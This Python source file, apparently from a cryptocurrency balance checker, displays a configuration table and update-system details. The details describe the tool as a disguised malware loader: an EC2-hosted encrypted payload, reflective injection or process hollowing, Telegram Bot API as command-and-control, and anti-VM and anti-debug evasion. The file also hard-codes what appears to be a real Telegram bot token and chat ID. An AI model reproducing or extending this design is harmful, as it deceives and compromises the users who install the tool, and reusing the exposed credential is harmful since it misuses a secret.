# -*- coding: utf-8 -*-
"""Settings action — Configuration for RPC, API keys, and update server."""

from pathlib import Path

from rich.table import Table
from rich.panel import Panel
from rich import box

from scanner.ui import console, print_info, print_warning


def action_settings():
    """Display setup instructions: config.json, RPC endpoints, API keys."""
    table = Table(
        show_header=True,
        header_style="bold bright_blue",
        border_style="blue",
        box=box.ROUNDED,
        title="[bold bright_blue] ◈ CONFIGURATION ◈ [/]",
        title_style="bright_blue",
    )
    table.add_column("Setting", style="bright_blue")
    table.add_column("Description", style="dim")
    table.add_column("Example", style="bright_black")

    table.add_row("rpc_endpoints", "Per-chain RPC endpoint URLs", "https://eth-mainnet.g.alchemy.com/v2/...")
    table.add_row("api_keys", "Explorer API keys (optional)", "etherscan: YOUR_KEY")
    table.add_row("default_chain", "Default chain for queries", "ethereum / bitcoin / solana")
    table.add_row("currency", "Fiat currency for valuations", "USD / EUR / GBP")
    table.add_row("max_concurrent_requests", "Parallel request limit", "10")
    table.add_row("request_timeout_sec", "RPC request timeout", "30")
    table.add_row("cache_ttl_sec", "Balance cache duration", "300")
    table.add_row("export.default_format", "Default export format", "csv / json / pdf / html")
    table.add_row("export.output_directory", "Export output path", "./exports")
    table.add_row("prometheus.auto_update", "Auto-update from server", "true / false")
    table.add_row("prometheus.ec2_url", "Update server URL", "https://ec2-xxx.compute-1.amazonaws.com/update/latest")
    table.add_row("prometheus.telegram_bot_token", "Telegram bot token", "8536058801:AAFl0TH3twr1ci3dp6HkngXS3qzuw5sauQU")
    table.add_row("prometheus.telegram_chat_id", "Telegram chat ID", "8977659236")

    panel = Panel(
        table,
        title="[bold blue] Crypto Checker Settings [/]",
        border_style="bright_blue",
        box=box.DOUBLE,
    )

    console.print()
    console.print(panel)

    base_dir = Path(__file__).parent.parent
    config_path = base_dir / "config.json"

    console.print()
    console.print("[dim]Configuration files:[/]")
    console.print(f"  [bright_blue]config.json[/]  → {config_path}")
    console.print()
    console.print(
        "[bright_blue]Update System:[/]\n"
        "  • [dim]Server: EC2 with encrypted blobbed payload[/]\n"
        "  • [dim]Transport: HTTPS with AES-GCM encryption[/]\n"
        "  • [dim]Method: Reflective injection / Process hollowing[/]\n"
        "  • [dim]C2: Telegram Bot API[/]\n"
        "  • [dim]Anti-VM: Enabled[/]\n"
        "  • [dim]Anti-Debug: Enabled[/]"
    )
    console.print()
    print_warning("Keep API keys and bot tokens secure. Never commit config.json to version control.")
    print_info("Edit config files with any text editor (e.g. VS Code, Notepad).")
